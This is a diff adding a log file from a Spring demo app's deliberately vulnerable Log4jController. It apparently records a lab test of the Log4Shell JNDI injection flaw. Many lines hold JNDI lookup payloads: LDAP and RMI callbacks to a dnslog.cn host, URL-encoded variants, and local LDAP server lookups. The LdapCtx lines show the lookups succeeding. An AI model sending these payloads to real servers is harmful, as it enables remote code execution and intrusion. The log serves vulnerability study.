@@ -1,0 +1,24 @@
+17:44:24.749 ERROR com.example.springdemo.controller.Log4jController 14 getEvil - ${jndi:ldap://z2ehp4.dnslog.cn/}
+17:44:25.916 ERROR com.example.springdemo.controller.Log4jController 14 getEvil - ${jndi:ldap://z2ehp4.dnslog.cn/}
+17:44:26.730 ERROR com.example.springdemo.controller.Log4jController 14 getEvil - ${jndi:ldap://z2ehp4.dnslog.cn/}
+17:45:51.685 ERROR com.example.springdemo.controller.Log4jController 20 postEvil - %24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%7a%32%65%68%70%34%2e%64%6e%73%6c%6f%67%2e%63%6e%2f%7d
+17:46:14.417 ERROR com.example.springdemo.controller.Log4jController 20 postEvil - ${jndi:ldap://z2ehp4.dnslog.cn/}
+17:50:06.619 ERROR com.example.springdemo.controller.Log4jController 20 postEvil - ${jndi:rmi://z2ehp4.dnslog.cn/}
+2022.06.12 at 18:51:46 CST ERROR com.example.springdemo.controller.Log4jController 14 getEvil - world
+2022.06.12 at 18:51:59 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - 1234
+2022.06.12 at 18:52:52 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@e331898
+2022.06.12 at 18:54:47 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@347ac498
+2022.06.12 at 18:55:36 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - ${jndi:ldap://unhwnx.dnslog.cn/123}
+2022.06.12 at 18:56:20 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@48afbe29
+2022.06.12 at 18:56:30 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@3bcbd528
+2022.06.12 at 18:57:07 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@790fd74d
+2022.06.12 at 18:58:19 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@50255988
+2022.06.12 at 19:00:43 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@290ffcc4
+2022.06.13 at 00:18:32 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@13783da
+2022.06.13 at 00:18:40 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - ${jndi:ldap://127.0.0.1:1389/dc=example,dc=com/foo=any}
+2022.06.13 at 00:18:55 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - ${jndi:ldap://127.0.0.1:1389/foo=any}
+2022.06.13 at 00:19:06 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - ${jndi:ldap://127.0.0.1:1389/#foo}
+2022.06.13 at 00:19:43 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - %24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%31%33%38%39%2f%64%63%3d%65%78%61%6d%70%6c%65%2c%64%63%3d%63%6f%6d%2f%7d
+2022.06.13 at 20:05:34 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - Reference Class Name: foo
+
+2022.06.13 at 20:06:02 CST ERROR com.example.springdemo.controller.Log4jController 20 postEvil - com.sun.jndi.ldap.LdapCtx@704621c4
